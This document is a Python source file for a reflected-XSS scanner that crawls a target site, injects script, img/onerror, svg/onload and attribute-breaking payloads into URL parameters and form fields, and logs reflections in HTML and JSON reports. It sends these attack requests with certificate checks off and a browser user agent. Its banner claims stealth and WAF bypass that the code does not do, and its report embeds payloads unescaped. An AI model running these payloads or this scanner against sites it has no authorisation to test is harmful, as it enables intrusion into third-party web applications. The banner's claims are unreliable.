#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced XSS Scanner - Final Version
Professional XSS Detection Tool with Matrix Theme
"""

import requests
import re
import time
import json
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import random
import os
import sys
from datetime import datetime
import hashlib
import argparse
from colorama import Fore, Back, Style, init
import socket

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScanner:
    def __init__(self, target_url, max_depth=3, delay=1, timeout=10):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.delay = delay
        self.timeout = timeout
        
        # Setup session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Results
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.parameters = {}
        
        # Custom signature
        self.signature = "XSS_CONFIRMED_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        # Enhanced payloads with tag closing
        self.payloads = {
            'html': [
                f'<script>alert("{self.signature}")</script>',
                f'<img src=x onerror=alert("{self.signature}")>',
                f'<svg onload=alert("{self.signature}")>',
                f'<iframe src="javascript:alert(\'{self.signature}\')"></iframe>',
            ],
            'attribute': [
                f'"><img src=x onerror=alert("{self.signature}")>',  # Close tag first
                f'\'>< img src=x onerror=alert("{self.signature}")>',
                f'"><svg onload=alert("{self.signature}")>',
                f'\'>< svg onload=alert("{self.signature}")>',
                f'"><script>alert("{self.signature}")</script>',
                f'" onmouseover="alert(\'{self.signature}\')" "',
                f'\' onmouseover=\'alert("{self.signature}")\' \'',
                f'" onfocus="alert(\'{self.signature}\')" autofocus "',
            ],
            'javascript': [
                f'\'; alert("{self.signature}"); //',
                f'\"; alert(\'{self.signature}\'); //',
                f'`; alert("{self.signature}"); //',
                f'</script><script>alert("{self.signature}")</script>',
            ],
            'url': [
                f'javascript:alert("{self.signature}")',
                f'data:text/html,<script>alert("{self.signature}")</script>',
            ]
        }
        
        # Statistics
        self.stats = {
            'urls_crawled': 0,
            'forms_found': 0,
            'parameters_found': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }

    def print_banner(self):
        """Matrix-style banner"""
        banner = f"""
{Fore.GREEN}
╔══════════════════════════════════════════════════════════════════════╗
║  {Fore.RED}██{Fore.GREEN}╗  {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗    {Fore.RED}███████{Fore.GREEN}╗ {Fore.RED}██████{Fore.GREEN}╗ {Fore.RED}█████{Fore.GREEN}╗ {Fore.RED}███{Fore.GREEN}╗   {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗  ║
║  {Fore.RED}╚██╗██╔╝{Fore.GREEN}██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗ ║
║   {Fore.RED}╚███╔╝ {Fore.GREEN}███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝ ║
║   {Fore.RED}██╔██╗ {Fore.GREEN}╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗ ║
║  {Fore.RED}██╔╝ ██╗{Fore.GREEN}███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║ ║
║  {Fore.RED}╚═╝  ╚═╝{Fore.GREEN}╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Advanced Cross-Site Scripting Detection Framework     ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Professional Penetration Testing Tool               ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}WAF Bypass • Context-Aware • Matrix Style           ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.YELLOW}Target:{Fore.WHITE} {self.target_url:<55} ║
║  {Fore.YELLOW}Config:{Fore.WHITE} Depth={self.max_depth} | Delay={self.delay}s | Timeout={self.timeout}s{' ' * (50 - len(f'Depth={self.max_depth} | Delay={self.delay}s | Timeout={self.timeout}s'))} ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Initializing neural network...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Loading payload database...{Fore.GREEN} DONE  
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Activating stealth mode...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Bypassing security systems...{Fore.GREEN} READY
"""
        print(banner)

    def test_connectivity(self):
        """Test target connectivity"""
        print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Testing target connectivity...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}CONN{Fore.GREEN}] {Fore.WHITE}Target responded - Status: {response.status_code}")
            return True
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connection failed - Check target URL")
            return False
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connectivity test failed: {e}")
            return False

    def crawl_target(self):
        """Crawl target and discover test points"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 1{Fore.GREEN}] {Fore.WHITE}RECONNAISSANCE & TARGET ENUMERATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        urls_to_scan = [self.target_url]
        
        # Add common endpoints
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        common_paths = [
            '/search', '/login', '/contact', '/register', '/profile',
            '/search?q=test', '/index.php?id=1', '/?search=test'
        ]
        
        for path in common_paths:
            urls_to_scan.append(base_url + path)
        
        for url in urls_to_scan[:10]:  # Limit to 10 URLs
            try:
                print(f"{Fore.GREEN}[{Fore.RED}CRAWL{Fore.GREEN}] {Fore.WHITE}Scanning: {url}")
                
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    self.crawled_urls.add(url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = self.extract_form_data(form, url)
                        if form_data:
                            self.forms.append(form_data)
                            print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}Found: {form_data['action']} ({len(form_data['inputs'])} inputs)")
                    
                    # Extract parameters
                    parsed = urlparse(url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        if url not in self.parameters:
                            self.parameters[url] = {}
                        for param, values in params.items():
                            self.parameters[url][param] = values[0] if values else ''
                            print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}Found: {param}")
                
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}{url} - {str(e)[:30]}")
        
        # Update stats
        self.stats['urls_crawled'] = len(self.crawled_urls)
        self.stats['forms_found'] = len(self.forms)
        self.stats['parameters_found'] = sum(len(p) for p in self.parameters.values())
        
        print(f"\n{Fore.GREEN}[{Fore.RED}RECON{Fore.GREEN}] {Fore.WHITE}Reconnaissance Summary:")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}URLs: {self.stats['urls_crawled']} | Forms: {self.stats['forms_found']} | Parameters: {self.stats['parameters_found']}")
        
        # Add fallback parameters if none found
        if not self.parameters and self.crawled_urls:
            main_url = list(self.crawled_urls)[0]
            self.parameters[main_url] = {
                'search': 'test', 'q': 'test', 'id': '1', 'name': 'test'
            }
            self.stats['parameters_found'] = 4
            print(f"{Fore.YELLOW}[{Fore.RED}FALLBACK{Fore.YELLOW}] {Fore.WHITE}Added 4 common test parameters")

    def extract_form_data(self, form, base_url):
        """Extract form data"""
        try:
            action = form.get('action', '') or base_url
            action_url = urljoin(base_url, action)
            method = form.get('method', 'GET').upper()
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name', '')
                if name and input_tag.get('type', '') not in ['submit', 'button']:
                    inputs.append({
                        'name': name,
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
            
            if inputs:
                return {
                    'action': action_url,
                    'method': method,
                    'inputs': inputs,
                    'base_url': base_url
                }
        except:
            pass
        return None

    def test_parameters(self):
        """Test URL parameters for XSS"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 2{Fore.GREEN}] {Fore.WHITE}PARAMETER EXPLOITATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        if not self.parameters:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No parameters to test")
            return
        
        for url, params in self.parameters.items():
            for param_name in params:
                print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Testing parameter: {param_name}")
                
                # Test each payload type
                for context, payloads in self.payloads.items():
                    for payload in payloads[:2]:  # Top 2 per context
                        if self.test_single_parameter(url, param_name, payload, context):
                            break  # Found vulnerability, move to next parameter
                        time.sleep(self.delay)

    def test_single_parameter(self, url, param_name, payload, context):
        """Test single parameter with payload"""
        try:
            # Build test URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query) if parsed.query else {}
            params[param_name] = [payload]
            
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            # Make request
            response = self.session.get(test_url, timeout=self.timeout)
            self.stats['payloads_tested'] += 1
            
            # Check for XSS
            if self.check_xss(response, payload):
                print(f"{Fore.YELLOW}[{Fore.RED}POTENTIAL{Fore.YELLOW}] {Fore.WHITE}XSS detected in {param_name}")
                
                # Simple verification
                if self.signature in response.text or self.verify_payload_execution(response, payload):
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'context': context,
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['vulnerabilities_found'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}XSS VULNERABILITY FOUND!")
                    print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}{param_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{test_url}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    return True
            
            return False
            
        except Exception as e:
            return False

    def check_xss(self, response, payload):
        """Check if response contains XSS"""
        try:
            text = response.text.lower()
            payload_lower = payload.lower()
            
            # Direct signature check
            if self.signature.lower() in text:
                return True
            
            # Look for dangerous patterns
            patterns = [
                (r'<script[^>]*>', r'alert\s*\('),
                (r'onerror\s*=', r'alert\s*\('),
                (r'onload\s*=', r'alert\s*\('),
                (r'onfocus\s*=', r'alert\s*\('),
                (r'javascript:', r'alert\s*\('),
            ]
            
            for tag_pattern, func_pattern in patterns:
                if (re.search(tag_pattern, text) and re.search(func_pattern, text) and
                    re.search(tag_pattern, payload_lower) and re.search(func_pattern, payload_lower)):
                    return True
            
            return False
        except:
            return False

    def verify_payload_execution(self, response, payload):
        """Verify if payload would execute"""
        try:
            # Check for unescaped dangerous content
            dangerous_indicators = [
                '<script>alert(',
                'onerror=alert(',
                'onload=alert(',
                'onfocus=alert(',
                'javascript:alert(',
                '"><img src=x onerror=',
                '"><svg onload=',
                '"><script>alert(',
            ]
            
            response_text = response.text
            for indicator in dangerous_indicators:
                if indicator in payload and indicator in response_text:
                    return True
            
            return False
        except:
            return False

    def test_forms(self):
        """Test forms for XSS"""
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing Forms...")
        
        if not self.forms:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No forms to test")
            return
        
        for form in self.forms:
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Form: {form['action']} ({form['method']})")
            
            for input_field in form['inputs']:
                input_name = input_field['name']
                print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}Testing: {input_name}")
                
                # Test with best payloads
                for context, payloads in self.payloads.items():
                    for payload in payloads[:1]:  # Best payload per context
                        if self.test_form_input(form, input_name, payload, context):
                            break
                        time.sleep(self.delay)

    def test_form_input(self, form, input_name, payload, context):
        """Test form input with payload"""
        try:
            # Prepare form data
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == input_name:
                    form_data[input_field['name']] = payload
                else:
                    # Default values
                    if 'email' in input_field['name'].lower():
                        form_data[input_field['name']] = 'test@example.com'
                    else:
                        form_data[input_field['name']] = input_field['value'] or 'test'
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            
            self.stats['payloads_tested'] += 1
            
            # Check for XSS
            if self.check_xss(response, payload):
                if self.signature in response.text or self.verify_payload_execution(response, payload):
                    vuln = {
                        'type': 'Form XSS',
                        'url': form['action'],
                        'parameter': input_name,
                        'payload': payload,
                        'context': context,
                        'method': form['method'],
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['vulnerabilities_found'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}FORM XSS VULNERABILITY!")
                    print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}{input_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}{form['action']}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    return True
            
            return False
            
        except Exception as e:
            return False

    def generate_report(self):
        """Generate HTML report"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #00ff00;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff00;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-card {{
            background: rgba(0, 50, 0, 0.5);
            border: 1px solid #00ff00;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }}
        .stat-number {{
            font-size: 2em;
            color: #ff0000;
            font-weight: bold;
            text-shadow: 0 0 10px #ff0000;
        }}
        .vulnerability {{
            background: rgba(50, 0, 0, 0.5);
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }}
        .payload {{
            background: #000;
            color: #00ff00;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            overflow-x: auto;
        }}
        .score {{
            background: linear-gradient(45deg, #ff0000, #ff6600);
            color: white;
            padding: 8px 15px;
            border-radius: 15px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>XSS SCANNER INTELLIGENCE REPORT</h1>
            <h2>{self.target_url}</h2>
            <p>SCAN TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{self.stats['urls_crawled']}</div>
                <div>URLS CRAWLED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['forms_found']}</div>
                <div>FORMS FOUND</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['payloads_tested']}</div>
                <div>PAYLOADS TESTED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['vulnerabilities_found']}</div>
                <div>VULNERABILITIES</div>
            </div>
        </div>
        
        <h2>VULNERABILITY REPORT</h2>
"""
        
        if not self.vulnerabilities:
            html_content += "<p>TARGET APPEARS SECURE - NO CONFIRMED VULNERABILITIES FOUND</p>"
        else:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
        <div class="vulnerability">
            <h3>VULNERABILITY #{i} - {vuln['type']}</h3>
            <p><strong>URL:</strong> {vuln['url']}</p>
            <p><strong>PARAMETER:</strong> {vuln['parameter']}</p>
            <p><strong>METHOD:</strong> {vuln['method']}</p>
            <p><strong>CONTEXT:</strong> {vuln['context']}</p>
            <p><strong>SCORE:</strong> <span class="score">{vuln['score']}/20</span></p>
            <p><strong>PAYLOAD:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>TIMESTAMP:</strong> {vuln['timestamp']}</p>
        </div>
"""
        
        html_content += """
    </div>
</body>
</html>
"""
        
        filename = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}HTML report: {filename}")
        return filename

    def generate_json_report(self):
        """Generate JSON report"""
        report_data = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'statistics': self.stats,
            'vulnerabilities': self.vulnerabilities
        }
        
        filename = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}JSON report: {filename}")
        return filename

    def run_scan(self):
        """Run complete scan"""
        self.print_banner()
        
        try:
            # Test connectivity
            if not self.test_connectivity():
                print(f"{Fore.RED}[{Fore.YELLOW}ABORT{Fore.RED}] {Fore.WHITE}Cannot connect to target")
                return
            
            # Phase 1: Crawling
            self.crawl_target()
            
            # Phase 2: Testing
            self.test_parameters()
            self.test_forms()
            
            # Generate reports
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}GENERATING REPORTS")
            print(f"{Fore.YELLOW}{'='*70}")
            
            html_report = self.generate_report()
            json_report = self.generate_json_report()
            
            # Final results
            print(f"\n{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}RESULTS{Fore.GREEN}] {Fore.WHITE}SCAN COMPLETE")
            print(f"{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}{self.target_url}")
            print(f"{Fore.GREEN}[{Fore.RED}STATS{Fore.GREEN}] {Fore.WHITE}URLs: {self.stats['urls_crawled']} | Forms: {self.stats['forms_found']} | Payloads: {self.stats['payloads_tested']}")
            print(f"{Fore.GREEN}[{Fore.RED}VULNS{Fore.GREEN}] {Fore.WHITE}{self.stats['vulnerabilities_found']} confirmed vulnerabilities")
            
            if self.vulnerabilities:
                print(f"\n{Fore.RED}[{Fore.GREEN}CRITICAL{Fore.RED}] {Fore.WHITE}VULNERABILITIES FOUND:")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    print(f"{Fore.RED}[{i}] {Fore.WHITE}{vuln['type']} in {vuln['parameter']} (Score: {vuln['score']}/20)")
            else:
                print(f"\n{Fore.GREEN}[{Fore.RED}SECURE{Fore.GREEN}] {Fore.WHITE}Target appears secure")
            
            print(f"\n{Fore.GREEN}[{Fore.RED}FILES{Fore.GREEN}] {Fore.WHITE}Reports generated: {html_report}, {json_report}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[{Fore.RED}ABORT{Fore.YELLOW}] {Fore.WHITE}Scan interrupted")
        except Exception as e:
            print(f"\n{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Scan failed: {e}")

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner - Final Version')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (default: 0.5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR] URL must start with http:// or https://")
        sys.exit(1)
    
    scanner = XSSScanner(
        target_url=args.url,
        max_depth=args.depth,
        delay=args.delay,
        timeout=args.timeout
    )
    
    scanner.run_scan()

if __name__ == "__main__":
    main()